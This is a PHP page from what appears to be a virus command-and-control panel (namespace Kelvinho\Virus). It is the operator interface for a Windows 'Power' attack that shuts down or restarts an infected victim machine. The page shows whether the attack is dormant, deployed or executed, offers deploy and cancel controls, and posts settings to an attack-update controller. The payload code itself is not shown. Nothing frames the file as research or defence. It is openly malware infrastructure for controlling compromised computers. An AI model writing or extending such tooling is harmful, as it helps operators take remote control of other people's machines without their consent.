<?php

use Kelvinho\Virus\Attack\AdminTemplates;
use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\AttackPackages\Windows\OneTime\Power;
use Kelvinho\Virus\Header;
use function Kelvinho\Virus\logAttackStatus;

if (!isset($_SESSION["attack_id"])) {
    header("Location: " . DOMAIN);
    Header::redirect();
} else {
    $attack = AttackInterface::get($_SESSION["attack_id"]);
    ?>
    <html lang="en_US">
    <?php echo AdminTemplates::header(); ?>
    <body>
    <?php echo AdminTemplates::body($attack); ?>
    <div>Current style</div>
    <input id="type" class="w3-input" type="text" value="<?php if ($attack->getType() == Power::$POWER_SHUTDOWN) {
        echo "Shutdown";
    } else {
        echo "Restart";
    }; ?>" disabled>
    <br>
    <div class="w3-button w3-red" onclick="toggle()">Toggle</div>
    <div class="w3-button w3-red" onclick="update()">Update</div>
    <?php
    switch ($attack->getStatus()) {
        case AttackInterface::STATUS_DORMANT: ?>
            <p>This attack is dormant. Click <a onclick="deployAttack()" class="link">here</a> to deploy.</p>
            <?php break;
        case AttackInterface::STATUS_DEPLOYED: ?>
            <p>This attack is deployed. Click <a onclick="cancelAttack()" class="link">here</a> to cancel the attack.
            </p>
            <?php break;
        case AttackInterface::STATUS_EXECUTED: ?>
            <p>This attack is executed.</p>
            <?php break;
        default:
            logAttackStatus($attack->getStatus());
    }
    ?>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
    <script type="application/javascript">
        function update() {
            $.ajax({
                url: "<?php echo DOMAIN_CONTROLLER . "/updateAttack.php"; ?>",
                type: "POST",
                data: {
                    virus_id: "<?php echo $attack->getVirusId(); ?>",
                    attack_id: "<?php echo $attack->getAttackId(); ?>",
                    name: $("#name").val(),
                    profile: $("#profile").val(),
                    type: $("#type").val()
                },
                success: function () {
                    window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>"
                }
            });
        }

        function toggle() {
            const element = $("#type");
            switch (element.val()) {
                case "Shutdown":
                    element.val("Restart");
                    break;
                case "Restart":
                    element.val("Shutdown");
                    break;
                default:
                    element.val("Restart");
                    break;
            }
        }
    </script>
    <?php echo AdminTemplates::script($attack); ?>
    </html>
<?php } ?>